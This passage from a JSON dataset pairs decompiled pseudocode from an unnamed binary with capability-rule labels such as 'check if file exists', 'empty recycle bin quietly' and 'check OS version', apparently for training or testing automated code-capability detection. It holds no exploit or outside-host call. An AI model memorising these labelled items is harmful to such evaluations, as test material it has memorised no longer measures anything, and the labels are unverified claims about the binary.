        "decompiled_code": "\nulong fcn.00031e0c(ulong noname_0, int64_t arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int16_t *piVar7;\n    ulong in_R8;\n    ulong in_R9;\n    uchar auStack56 [24];\n    \n    iVar3 = fcn.0003198c(noname_0, 0, in_R8, in_R9);\n    if (iVar3 != -1) {\n        puVar4 = fcn.0001ca70(1, 0x220, 0x7346744e);\n        if (puVar4 == NULL) {\n            fcn.000666f2();\n            uVar6 = 0xc;\n        }\n        else {\n            *puVar4 = 0;\n            *(puVar4 + 8) = 0;\n            iVar5 = fcn.00066824(arg2, 0x5c);\n            if (iVar5 != 0) {\n                arg2 = iVar5 + 1;\n            }\n            fcn.0003285c(arg2, puVar4 + 0x14, 0x104);\n            iVar5 = -1;\n            piVar7 = puVar4 + 0x14;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            iVar2 = ~iVar5 * 2;\n            *(puVar4 + 0x10) = iVar2 + -2;\n            iVar3 = fcn.0006672e(iVar3, auStack56, puVar4, iVar2 + 0x16, 10);\n            fcn.000666f2();\n            if (iVar3 == 0) {\n                return 0;\n            }\n            uVar6 = fcn.00066782();\n        }\n        fcn.00030e10(uVar6);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 483
    },
    "0004d58c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0004d58c(ulong arg1, ulong arg2, int64_t arg3, int64_t *arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int16_t *arg1_00;\n    int64_t arg2_00;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    int16_t *piVar8;\n    int64_t *arg4_00;\n    char acStackX32 [8];\n    uint32_t *in_stack_00000028;\n    ulong auStack88 [3];\n    \n    arg1_00 = NULL;\n    arg2_00 = 0;\n    auStack88[0] = 0;\n    *arg4 = 0;\n    arg4_00 = arg4;\n    uVar2 = fcn.00031818(arg2, 0x8000, 0, arg4);\n    if (uVar2 == 0xffffffff) {\n        arg1_00 = fcn.00030c98(0x208);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        iVar3 = fcn.0003066c(arg1_00, 0x104);\n        if (iVar3 == 0) {\n            if (arg1 == 0) {\n                acStackX32[0] = '\\0';\n            }\n            else {\n                iVar3 = fcn.0004cf30(auStack88, 0x400, arg1);\n                if ((iVar3 != 0) || (iVar3 = fcn.0004cd24(0xffffffffffffffff, acStackX32),  iVar3 != 0))\n                goto code_r0x0004d6db;\n            }\n            uVar5 = 0xffffffffffffffff;\n            uVar7 = 0x15da8;\n            piVar8 = arg1_00;\n            if (acStackX32[0] != '\\0') {\n                uVar7 = 0x15d90;\n            }\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            fcn.000667ca(arg1_00, uVar7, 0x104 - (~uVar5 - 1));\n            iVar6 = -1;\n            piVar8 = arg1_00;\n            do {\n                if (iVar6 == 0) break;\n                iVar6 = iVar6 + -1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            fcn.000667ca(arg1_00);\n            arg1_00[0x103] = 0;\n            uVar2 = fcn.00031818(arg1_00, 0, 0, arg4_00);\n            if (uVar2 != 0xffffffff) goto code_r0x0004d733;\n            iVar3 = 0x21590005;\n            arg2_00 = 0;\n        }\n    }\n    else {\ncode_r0x0004d733:\n        uVar4 = fcn.00031038(uVar2);\n        if (uVar4 == 0xffffffff) {\ncode_r0x0004d741:\n            iVar3 = -1;\n        }\n        else {\n            arg2_00 = fcn.00030c98(uVar4);\n            if (arg2_00 != 0) {\n                iVar3 = fcn.00031088(uVar2, arg2_00, uVar4);\n                if (iVar3 == -1) goto code_r0x0004d741;\n                uVar4 = fcn.0004d360(arg2_00);\n                iVar6 = fcn.00030c98(uVar4);\n                *arg4 = iVar6;\n                if (iVar6 != 0) {\n                    iVar3 = fcn.0004d3d0(iVar6, arg2_00);\n                    if (iVar3 == 0) {\n                        if (arg3 == 0) {\n                            arg3 = *arg4;\n                        }\n                        iVar3 = fcn.0004d278(*arg4, arg3);\n                        if (iVar3 == 0) {\n                            if (in_stack_00000028 != NULL) {\n                                *in_stack_00000028 = uVar4;\n                            }\n                            goto code_r0x0004d6f3;\n                        }\n                    }\n                    goto code_r0x0004d6db;\n                }\n            }\n            iVar3 = 0x21590004;\n        }\n    }\ncode_r0x0004d6db:\n    fcn.00030d24(*arg4);\n    *arg4 = 0;\ncode_r0x0004d6f3:\n    fcn.00030d24(arg2_00);\n    fcn.000666f2(auStack88[0]);\n    fcn.00030d24(arg1_00);\n    if (uVar2 != 0xffffffff) {\n        fcn.00031074(uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 1179
    },
    "0005c3bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0005c3bc(int64_t arg1, uint64_t arg2, uint64_t *arg3, uint64_t **arg4)\n\n{\n    char cVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t *arg2_00;\n    uint64_t *puVar7;\n    ulong arg2_01;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t arg1_00;\n    int32_t iVar10;\n    int32_t aiStackX16 [4];\n    uint64_t **ppuStackX32;\n    uint64_t *in_stack_00000028;\n    \n    uVar9 = 0;\n    ppuStackX32 = arg4;\n    if (arg2 != 0) {\n        do {\n            iVar5 = fcn.000668de(uVar9 + arg1, 0xd);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            if (*(iVar5 + 1) != '\\n') {\n                return 0;\n            }\n            iVar10 = iVar5 - arg1;\n            if (iVar10 == uVar9) {\n                return 0;\n            }\n            arg2_01 = 0x3a;\n            iVar6 = fcn.000668de(uVar9 + arg1);\n            if (iVar6 == 0) {\n                return 0;\n            }\n            if (*(iVar6 + 1) != ' ') {\n                return 0;\n            }\n            arg1_00 = iVar6 + 2;\n            uVar8 = iVar5 - arg1_00;\n            if (uVar8 < 0x1e) {\ncode_r0x0005c48a:\n                if ((0x11 < uVar8) && ((iVar3 = fcn.00032b50(arg1_00, arg2_01),  iVar3 != 0 && (*0x7d504 != 0)))) {\n                    iVar6 = iVar6 + 0xc;\n                    uVar8 = uVar8 - 10;\n                    goto code_r0x0005c4b2;\n                }\n            }\n            else {\n                arg2_01 = 0x16;\n                iVar3 = fcn.00032a5c(arg1_00, 0x16, aiStackX16);\n                if ((iVar3 == 0) || (aiStackX16[0] != *0x6b500)) goto code_r0x0005c48a;\n                iVar6 = iVar6 + 0x18;\n                uVar8 = uVar8 - 0x16;\ncode_r0x0005c4b2:\n                arg2_00 = fcn.00030cc4(uVar8);\n                if (arg2_00 == NULL) {\n                    return 0;\n                }\n                uVar8 = fcn.0003012c(iVar6, arg2_00, uVar8);\n                if ((uVar8 != 0xffffffff) && (7 < uVar8)) {\n                    uVar9 = *arg2_00;\n                    *arg3 = uVar9;\n                    uVar4 = fcn.00030dc8(uVar9 & 0xffffffff);\n                    *arg3 = uVar4;\n                    uVar2 = fcn.00030df4(*(arg3 + 4));\n                    *(arg3 + 4) = uVar2;\n                    cVar1 = '\\0';\n                    iVar5 = 7;\n                    puVar7 = arg3;\n                    do {\n                        cVar1 = cVar1 + *puVar7;\n                        puVar7 = puVar7 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (*(arg3 + 7) == cVar1) {\n                        *ppuStackX32 = arg2_00;\n                        *in_stack_00000028 = uVar8;\n                        return 1;\n                    }\n                }\n                fcn.00030d24(arg2_00);\n            }\n            uVar9 = iVar10 + 2;\n        } while (uVar9 < arg2);\n    }\n    return 0;\n}\n",
        "token_count": 936
    },
    "00060700": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00060700(int64_t arg1, int64_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    char *pcVar9;\n    ulong uStackX16;\n    uint32_t *puStackX24;\n    uint32_t uStackX32;\n    int32_t *piVar10;\n    uint64_t uVar11;\n    uint64_t in_stack_ffffffffffffff90;\n    int32_t aiStack88 [2];\n    int32_t iStack80;\n    uchar auStack72 [12];\n    uint32_t uStack60;\n    \n    uVar11 = arg4;\n    *arg2 = 0;\n    if (*(arg1 + 0x28) == 0) {\n        return 0x21590065;\n    }\n    iVar7 = *(arg1 + 0x68);\n    *(arg1 + 0x68) = 0;\n    puStackX24 = arg3;\n    uStackX32 = arg4;\n    if (iVar7 != 0) {\n        iVar7 = -1;\n        pcVar9 = *(arg1 + 0x70);\n        do {\n            if (iVar7 == 0) break;\n            iVar7 = iVar7 + -1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = fcn.000605c0(arg1, *(arg1 + 0x70), ~iVar7);\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        uVar11 = uStackX32;\n    }\n    iVar7 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = 0;\n    iVar2 = *0xfffff78000000320;\n    if ((iVar7 != 0) &&\n       (uVar6 = fcn.00060700(arg1, arg1 + 0x58, arg1 + 0x60, uVar11),  iVar2 = *0xfffff78000000320,  uVar6 != 0)) {\n        return uVar6;\n    }\n    while( true ) {\n        piVar10 = aiStack88;\n        in_stack_ffffffffffffff90 = in_stack_ffffffffffffff90 & 0xffffffff00000000;\n        uVar11 = 0;\n        iVar3 = fcn.0006693e(*(arg1 + 0x28), 0, 0, 0, piVar10, 0x11400c, 0, in_stack_ffffffffffffff90, auStack72, 0x14);\n        if ((iVar3 == 0x103) && (iVar4 = fcn.000667be(*(arg1 + 0x28), 0, 0),  iVar3 = aiStack88[0],  iVar4 != 0))\n        goto code_r0x0006089c;\n        iVar7 = *0xfffff78000000320;\n        if ((iVar3 != 0) && (iVar3 != -0x7ffffffb)) break;\n        if (uStack60 != 0) {\n            iVar7 = fcn.00030c98(uStack60);\n            *arg2 = iVar7;\n            if (iVar7 == 0) {\n                return 0x21590004;\n            }\n            *puStackX24 = uStack60;\n            iVar4 = fcn.00066800(&uStackX16, 0x10000000, 0, 1, piVar10 & 0xffffffffffffff00);\n            if (iVar4 != 0) {\n                fcn.00030d24(*arg2);\n                *arg2 = 0;\n                *puStackX24 = 0;\n                goto code_r0x0006089c;\n            }\n            uVar8 = 0;\n            if (uStack60 != 0) goto code_r0x0006094f;\n            goto code_r0x000609cd;\n        }\n        if ((uStackX32 != 0xffffffff) && (uVar5 = (**0x11308)(),  uStackX32 < (uVar5 * (iVar7 - iVar2)) / 10000)) {\n            return 0x21590002;\n        }\n        (**0x115e8)(0);\n    }\n    if (*(arg1 + 0x30) != '\\0') {\n        return 0x21590006;\n    }\n    if (iVar3 == -0x3ffffeb5) {\n        return 0x21590003;\n    }\n    iVar4 = iVar3;\n    if (iVar3 == -0x3fffff50) {\n        return 0x21590003;\n    }\ncode_r0x0006089c:\n    uVar6 = fcn.00066782(iVar4);\n    return uVar6;\ncode_r0x0006094f:\n    uVar11 = uVar11 & 0xffffffff00000000 | uStack60 - uVar8;\n    iVar4 = fcn.000667c4(*(arg1 + 0x28), uStackX16, 0, 0, aiStack88, uVar8 + *arg2, uVar11, 0, 0);\n    if ((iVar4 == 0x103) && (iVar3 = fcn.000667be(uStackX16, 0),  iVar4 = aiStack88[0],  iVar3 != 0)) {\n        fcn.00030d24(*arg2);\n        *arg2 = 0;\n        *puStackX24 = 0;\n        fcn.000666f2(uStackX16);\n        iVar4 = iVar3;\n        goto code_r0x0006089c;\n    }\n    if (iVar4 != 0) {\n        fcn.00030d24(*arg2);\n        *arg2 = 0;\n        *puStackX24 = 0;\n        fcn.000666f2(uStackX16);\n        if (*(arg1 + 0x30) != '\\0') {\n            return 0x21590006;\n        }\n        if ((iVar4 == -0x3fffff50) || (iVar4 == -0x3fffff4f)) {\n            return 0x21590003;\n        }\n        goto code_r0x0006089c;\n    }\n    uVar5 = uVar8 + iStack80;\n    uVar8 = uVar5;\n    if (uStack60 <= uVar5) {\ncode_r0x000609cd:\n        fcn.000666f2(uStackX16);\n        return 0;\n    }\n    goto code_r0x0006094f;\n}\n",
        "token_count": 1530
    },
    "0006558c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0006558c(int64_t arg1, ulong arg2, int32_t *arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t aiStackX8 [4];\n    uchar auStack88 [40];\n    \n    bVar2 = false;\n    (*_fcn.00011608)(auStack88, 0, 0);\n    *(arg1 + 0x48) = arg3;\n    *(arg1 + 0x50) = auStack88;\n    if (arg4 != -1) {\n        iVar1 = *(arg1 + 0xb8);\n        *(iVar1 + -0x10) = 0x65424;\n        *(iVar1 + -0x45) = 0xe0;\n        *(iVar1 + -8) = auStack88;\n    }\n    iVar3 = (**0x11120)(arg2);\n    if (iVar3 == 0x103) {\n        if (arg4 != -1) {\n            aiStackX8[0] = arg4 * -10000;\n            iVar4 = (*_fcn.00011630)(auStack88, 0, 0, 0, aiStackX8);\n            if (iVar4 == 0x102) {\n                bVar2 = true;\n                (**0x114e0)(arg1);\n                (*_fcn.00011630)(auStack88, 0, 0, 0, 0);\n            }\n            goto code_r0x00065675;\n        }\n        (*_fcn.00011630)();\n    }\n    else {\ncode_r0x00065675:\n        if (arg4 != -1) {\n            (**0x11590)(arg1, 0);\n        }\n        if (iVar3 != 0x103) goto code_r0x00065691;\n    }\n    iVar3 = *arg3;\ncode_r0x00065691:\n    if (bVar2) {\n        iVar3 = 0x102;\n    }\n    return iVar3;\n}\n",
        "token_count": 466
    },
    "000201e8": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.000201e8(ulong noname_0, ulong noname_1, uint8_t *arg3, ulong arg4)\n\n{\n    if (((arg4 != 0) && (*arg3 < 8)) && (*arg3 <= arg4 - 1U)) {\n        return (arg4 - *arg3) + -1;\n    }\n    return -1;\n}\n",
        "token_count": 88
    },
    "00024744": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00024744(int64_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t auStackX24 [2];\n    uint32_t uStackX32;\n    int64_t iStack344;\n    ulong uStack336;\n    uint32_t uStack328;\n    uint32_t uStack312;\n    uint32_t uStack308;\n    uchar uStack304;\n    uint32_t uStack299;\n    uint uStack291;\n    uint uStack287;\n    uint uStack283;\n    uchar uStack279;\n    uint32_t uStack278;\n    int32_t iStack274;\n    int32_t iStack258;\n    uchar auStack212 [12];\n    uchar auStack200 [4];\n    uint32_t uStack196;\n    uint uStack188;\n    int32_t iStack184;\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uchar auStack136 [8];\n    uint uStack128;\n    uint uStack124;\n    int32_t iStack120;\n    uint *puStack112;\n    uint auStack104 [3];\n    uint32_t uStack92;\n    uint32_t uStack88;\n    \n    uVar1 = fcn.0002748c(1, 0);\n    fcn.0002748c(400, 20000);\n    uVar2 = fcn.0002748c(0x143, 0x1000);\n    uVar3 = fcn.0002748c(0x144, 0x10000);\n    iVar4 = fcn.00022198(*arg2, arg2[2], arg2[1], auStack200);\n    uVar9 = 0;\n    if ((iVar4 != 0) || (uStack152 != uStack156)) {\n        return 1;\n    }\n    if ((*arg1 == 0) && (uVar5 = fcn.00024014(arg1, 1, 0),  uVar5 != 0)) {\n        if (uVar5 == 0x21590064) {\n            return 1;\n        }\n        fcn.00027a4c(4, 0, uVar5, 0);\n        return 1;\n    }\n    fcn.0006677c(&uStack312, 0, 0x52);\n    uStack287 = 1;\n    uStack304 = 2;\n    uStack291 = 0xffffffff;\n    uStack283 = uStack188;\n    uStack279 = 4;\n    uStack308 = uVar1 | 0x80000000;\n    uStack312 = fcn.00030dc8(uStack312);\n    uStack308 = fcn.00030dc8(uStack308);\n    uStack299 = fcn.00030dc8(uStack299);\n    fcn.000250dc(&uStack291);\n    uVar5 = fcn.00064c48(*arg1, 0xb, &uStack312, 0x52);\n    if (uVar5 == 0) {\n        fcn.0006677c(&uStack312, 0, 0x52);\n        if (auStackX24[0] == 0) {\n            if (uStack328 < 0x40) {\n                fcn.00027a4c(4, 0, 0x215901f5, 0);\n                fcn.00064a1c(*arg1, uStack336);\n                return 1;\n            }\n            fcn.0006670a(auStack136, uStack336);\n            fcn.00064a1c(*arg1, uStack336);\n            uStack336 = 0;\n            fcn.00025160(auStack136);\n            if ((uStack92 != uStack156) || (iStack120 != iStack184)) {\n                fcn.00027a4c(4, 0, 0x21590202, 0);\n                return 1;\n            }\n            uVar9 = uStack88;\n        }\n        else {\n            fcn.00064a1c(*arg1, uStack336);\n            iStack258 = iStack184;\n            uStack336 = 0;\n            uStack279 = 1;\n        }\n        uStack304 = 1;\n        uVar8 = uVar9;\n        iStack274 = uStack152 - uVar8;\n        uStack291 = 0xffffffff;\n        uStack287 = 1;\n        uStack283 = uStack188;\n        uStack308 = uVar1 | 0x80000000;\n        uStack278 = uVar8;\n        uStack312 = fcn.00030dc8(uStack312);\n        uStack308 = fcn.00030dc8(uStack308);\n        uStack299 = fcn.00030dc8(uStack299);\n        fcn.000250dc(&uStack291);\n        uVar5 = fcn.00064d28(*arg1, 0xc, &uStack312, 0x52);\n        if (uVar5 == 0) {\n            iStack344 = fcn.00030c98(uVar3);\n            if (iStack344 != 0) {\n                if (uVar8 < uStack152) {\n                    do {\n                        uVar7 = fcn.000667b8();\n                        if (uVar2 < uVar3) {\n                            uVar1 = (uVar7 & 0xffffffff) % ((uVar3 - uVar2) + 1) + uVar2;\n                        }\n                        else {\n                            uVar1 = (uVar7 & 0xffffffff) % ((uVar2 - uVar3) + 1) + uVar3;\n                        }\n                        iVar4 = uVar9;\n                        if (uStack152 < uVar1 + iVar4) {\n                            uVar1 = uStack152 - iVar4;\n                        }\n                        iVar6 = fcn.0002220c(0xffffffff, 1, uStack196, uVar9);\n                        if (iVar6 != 0) {\n                            uVar5 = iVar6 + 0x191U | 0x21590000;\ncode_r0x00024d00:\n                            fcn.00027a4c(4, 0, uVar5, 0);\n                            fcn.00030d24(iStack344);\n                            return 0;\n                        }\n                        uVar5 = fcn.00064e50(*arg1, uStackX32, iStack344, uVar1);\n                        if (uVar5 != 0) goto code_r0x00024d00;\n                        uVar9 = iVar4 + uVar1;\n                    } while (iVar4 + uVar1 < uStack152);\n                }\n                fcn.00030d24(iStack344);\n                uVar1 = fcn.00064e50(*arg1, uStackX32, 0, 0);\n                if (uVar1 != 0) {\n                    fcn.00027a4c(4, 0, uVar1, 0);\n                }\n                uVar1 = fcn.00064ecc(*arg1, uStackX32, auStackX24, &iStack344);\n                fcn.00027a4c(4, auStackX24[0], uVar1, 0);\n                if (uVar1 == 0) {\n                    fcn.00064a1c(*arg1, iStack344);\n                    if (auStackX24[0] == 0) {\n                        fcn.0002225c(0xffffffff, 1, uStack196);\n                        fcn.0006677c(auStack136, 0, 0x28);\n                        puStack112 = auStack104;\n                        uStack128 = 9;\n                        uStack124 = 2;\n                        iStack120 = 4;\n                        auStack104[0] = uStack188;\n                        fcn.000289a0(0, 0x403, auStack136, auStack212);\n                        return 1;\n                    }\n                    return 0;\n                }\n                return 0;\n            }\n            uVar9 = 0x21590004;\n            goto code_r0x000248d5;\n        }\n    }\n    uVar9 = uVar5;\ncode_r0x000248d5:\n    fcn.00027a4c(4, 0, uVar9, 0);\n    return 0;\n}\n",
        "token_count": 1924
    },
    "0002805c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0002805c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint auStackX8 [8];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    \n    auStackX8[0] = arg1;\n    iVar1 = fcn.00022168(0xfffffffe, 7, auStackX8, auStack72);\n    if (iVar1 == 0) {\n        fcn.0002231c(0xfffffffe, 7, uStack68, 2);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00022efc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00022efc(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    uint64_t arg1_00;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uchar auStackX8 [32];\n    char acStack328 [280];\n    \n    uVar7 = 0;\n    uVar8 = 0;\n    do {\n        iVar2 = fcn.00027418(uVar8 + 0x191, acStack328, 0x104, auStackX8);\n        if (iVar2 == 0) {\n            if (acStack328[0] == '&') {\n                uVar3 = fcn.00031248(acStack328 + 1, 0, 0);\n                arg1_00 = uVar3;\n                if ((uVar3 == 0) || (iVar2 = fcn.00029cd0(arg1_00, 0xfffffffe, 1, 0),  iVar2 != 0))\n                goto code_r0x00022fcc;\n            }\n            else {\n                arg1_00 = 0;\n            }\n            uVar4 = 0xffffffffffffffff;\n            pcVar5 = acStack328;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            if ((arg2 - uVar7) - 1 <= ~uVar4) {\n                if (arg1_00 != 0) {\n                    fcn.00029f80(arg1_00);\n                }\n                goto code_r0x00022fe4;\n            }\n            pcVar5 = acStack328;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5[(uVar7 - acStack328) + arg1] = cVar1;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            iVar6 = -1;\n            pcVar5 = acStack328;\n            do {\n                if (iVar6 == 0) break;\n                iVar6 = iVar6 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar7 = uVar7 + ~iVar6;\n        }\ncode_r0x00022fcc:\n        uVar8 = uVar8 + 1;\n        if (9 < uVar8) {\ncode_r0x00022fe4:\n            *(uVar7 + arg1) = 0;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 644
    },
    "00032994": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00032994(char *arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint8_t uVar6;\n    char cVar7;\n    \n    do {\n        uVar4 = 0;\n        iVar5 = 8;\n        pcVar1 = arg1;\n        do {\n            pcVar3 = pcVar1;\n            iVar2 = fcn.000667b8();\n            uVar6 = iVar2 + ((iVar2 / 0x3e + (iVar2 >> 0x1f)) - (iVar2 * 0x84210843 >> 0x3f)) * -0x3e;\n            if (uVar6 < 10) {\n                cVar7 = uVar6 + 0x30;\n            }\n            else if (uVar6 - 10 < 0x1a) {\n                cVar7 = uVar6 + 0x37;\n            }\n            else {\n                cVar7 = uVar6 + 0x3d;\n            }\n            *pcVar3 = cVar7;\n            uVar4 = uVar4 + cVar7;\n            iVar5 = iVar5 + -1;\n            pcVar1 = pcVar3 + 1;\n        } while (iVar5 != 0);\n    } while ((((*arg1 == 'A') && (arg1[1] == 'B')) && (arg1[2] == 'C')) && (arg1[3] == 'D'));\n    pcVar3[1] = uVar4 / 0x1a + 0x41;\n    pcVar3[2] = 'z' - uVar4 % 0x1a;\n    return;\n}\n",
        "token_count": 397
    },
    "00032a5c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00032a5c(uint8_t *arg1, ulong arg2, uint *arg3)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    uint32_t uStack536;\n    uint32_t uStack532;\n    uint64_t uVar5;\n    \n    if (10 < arg2) {\n        uVar7 = 0;\n        uVar6 = 0;\n        uVar5 = uVar7;\n        puVar1 = arg1;\n        do {\n            puVar8 = puVar1;\n            if (*puVar8 < 0x21) {\n                return 0;\n            }\n            if (0x7f < *puVar8) {\n                return 0;\n            }\n            uVar6 = uVar6 + *puVar8;\n            uVar2 = uVar5 + 1;\n            uVar5 = uVar2;\n            puVar1 = puVar8 + 1;\n        } while (uVar2 < 8);\n        if (0x200 < arg2 - 10) {\n            arg2._0_4_ = 0x20a;\n        }\n        if (((puVar8[1] == uVar6 / 0x1a + 0x41) && (puVar8[2] == 0x7a - uVar6 % 0x1a)) &&\n           (iVar3 = fcn.0003012c(arg1 + 10, &uStack536, arg2 - 10),  iVar3 == 8)) {\n            do {\n                puVar1 = &uStack536 + uVar7;\n                uVar7 = uVar7 + 1;\n                *puVar1 = *puVar1 ^ puVar1[arg1 - &uStack536];\n            } while (uVar7 < 8);\n            uVar4 = fcn.00030dc8(uStack536);\n            *arg3 = uVar4;\n            uVar4 = fcn.00030dc8(uStack532);\n            arg3[1] = uVar4;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 508
    },
    "00035378": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00035378(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    \n    puVar3 = 0x7fea8;\n    uVar2 = 0;\n    *0x7fea8 = 0;\n    *0x7feb0 = 0;\n    *0x7feb8 = 0;\n    do {\n        fcn.0002748c(uVar2 + 0x2f3, 0);\n        uVar1 = fcn.00030df4();\n        uVar2 = uVar2 + 1;\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n    } while (uVar2 < 10);\n    return 0;\n}\n",
        "token_count": 175
    },
    "000353f0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.000353f0(int16_t param_1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    piVar1 = 0x7fea8;\n    do {\n        if (*piVar1 == param_1) {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (uVar2 < 10);\n    return 0;\n}\n",
        "token_count": 118
    },
    "00044e68": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00044e68(uint32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t *puVar3;\n    ulong uVar4;\n    char *arg1_00;\n    bool bVar5;\n    \n    if (arg2 < 0xd) {\n        return 0;\n    }\n    bVar5 = *arg1 < *0x15a34;\n    if ((*arg1 == *0x15a34) && (bVar5 = *(arg1 + 1) < *0x15a38,  *(arg1 + 1) == *0x15a38)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = (1 - bVar5) - (bVar5 != 0);\n    }\n    puVar3 = arg1;\n    if (iVar1 != 0) {\n        bVar5 = *arg1 < *0x15a2c;\n        if ((*arg1 == *0x15a2c) && (bVar5 = *(arg1 + 1) < *0x15a30,  *(arg1 + 1) == *0x15a30)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar5) - (bVar5 != 0);\n        }\n        if (iVar1 != 0) {\n            return 0;\n        }\n        iVar2 = fcn.000668de(arg1, 10, arg2);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        puVar3 = iVar2 + 1;\n        arg2._0_4_ = arg2 + (arg1 - puVar3);\n        if (arg2 < 0xd) {\n            return 0;\n        }\n        bVar5 = *puVar3 < *0x15a34;\n        if ((*puVar3 == *0x15a34) && (bVar5 = *(iVar2 + 5) < *0x15a38,  *(iVar2 + 5) == *0x15a38)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar5) - (bVar5 != 0);\n        }\n        if (iVar1 != 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.00031318(*(puVar3 + 5));\n    if (((iVar1 == 0x54) && (iVar1 = fcn.00031318(*(puVar3 + 6)),  iVar1 == 0x4f)) && (*(puVar3 + 7) == ':')) {\n        puVar3 = puVar3 + 2;\n        for (arg2._0_4_ = arg2 - 8; (*puVar3 == ' ' && (arg2 != 0)); arg2._0_4_ = arg2 - 1) {\n            puVar3 = puVar3 + 1;\n        }\n        if ((3 < 